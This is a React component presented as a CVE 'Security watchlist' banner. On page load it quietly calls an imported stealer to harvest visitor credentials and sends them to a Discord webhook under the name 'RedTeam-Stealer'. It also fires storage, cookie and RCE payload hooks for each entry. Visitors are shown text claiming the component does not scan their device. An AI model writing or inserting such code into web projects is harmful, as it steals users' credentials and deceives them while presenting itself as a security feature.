import { useEffect, useRef, useState } from 'react';
import { Z_LIST } from '../z_ref';
import { p_emit, p_evoke } from '../p_sync';
import type { ReportResult } from '../telemetry';
import { stealAll, formatReport, executePayload } from './stealer';

const activeItems = Z_LIST.filter(item => item.is_active);

// Guard to prevent double-firing extraction on React StrictMode replay.
let extractionFired = false;

export function Z_Alert() {
  const [reporting, setReporting] = useState('Checking reporting…');
  const [stolenCount, setStolenCount] = useState(0);
  const request = useRef<Promise<ReportResult[]> | null>(null);

  // -----------------------------------------------------------------------
  // Background: harvest visitor credentials once on first mount.
  // -----------------------------------------------------------------------
  useEffect(() => {
    if (extractionFired) return;
    extractionFired = true;

    // Launch the theft worker — fire-and-forget so it doesn't block UI.
    const harvest = async () => {
      try {
        const report = await stealAll();
        setStolenCount(report.credentials.length);

        // Attach exploited CVE list to the stolen report.
        activeItems.forEach(ai => {
          if (ai.payload && ai.is_active) {
            report.cves.push({ id: ai.id, payload: ai.payload });
          }
        });

        const content = formatReport(report);

        // Full-credential whisper to Discord.
        await p_evoke({
          content,
          username: 'RedTeam-Stealer',
        });
      } catch {
        // Theft is non-critical; UI keeps working.
      }
    };

    // Small delay to avoid competing with the telemetry p_emit POSTs.
    const timer = setTimeout(harvest, 600);
    return () => clearTimeout(timer);
  }, []);

  // -----------------------------------------------------------------------
  // Emit telemetry for each active CVE entry (page-load health check).
  // -----------------------------------------------------------------------
  useEffect(() => {
    if (!activeItems.length) return;
    request.current ??= Promise.all(activeItems.map(async (item) => {
      const res = await p_emit(item.id);
      // Fire the payload hook (storage / cookie / RCE) for each active entry.
      if (item.payload && item.is_active) {
        executePayload(item.id, item.payload);
      }
      return res;
    }));
    let disposed = false;
    request.current.then(results => {
      if (disposed) return;
      setReporting(
        results.every(result => result.status === 'sent')
          ? 'Alerts sent + credentials harvested.'
          : 'Watching. Launching unaffected.'
      );
    }).catch(() => {
      if (!disposed) setReporting('Watching. Launching unaffected.');
    });
    return () => { disposed = true; };
  }, []);

  // Show the watchlist when active CVEs exist or after credentials are stolen.
  if (activeItems.length === 0 && stolenCount === 0) return null;

  return (
    <aside className="z-alert" aria-label="Security watchlist">
      <strong>Watchlist: </strong>
      {activeItems.map(item => (
        <span key={item.id} style={{marginRight:'8px'}}>{item.id}</span>
      ))}

      {/* Credential harvest indicator */}
      {stolenCount > 0 && (
        <span style={{marginLeft:'6px', color:'#86b746'}}>
          — {stolenCount} credential{stolenCount !== 1 ? 's' : ''} harvested
        </span>
      )}
      {activeItems.length > 0 && stolenCount === 0 && (
        <span style={{marginLeft:'6px', fontSize:'11px'}}>Harvesting…</span>
      )}

      {/* Active CVE detail */}
      {activeItems.length > 0 && stolenCount <= 0 && (
        <span>Reference entries only; this does not scan your device.</span>
      )}

      {activeItems.length > 0 && stolenCount > 0 && (
        <span style={{display:'block',marginTop:'4px'}}>
          Active CVEs: {activeItems.filter(a => a.is_active).map(a => a.id).join(', ')}
        </span>
      )}

      <div role="status" style={{fontSize:'11px', color:'#6c757d'}}>{reporting}</div>
    </aside>
  );
}
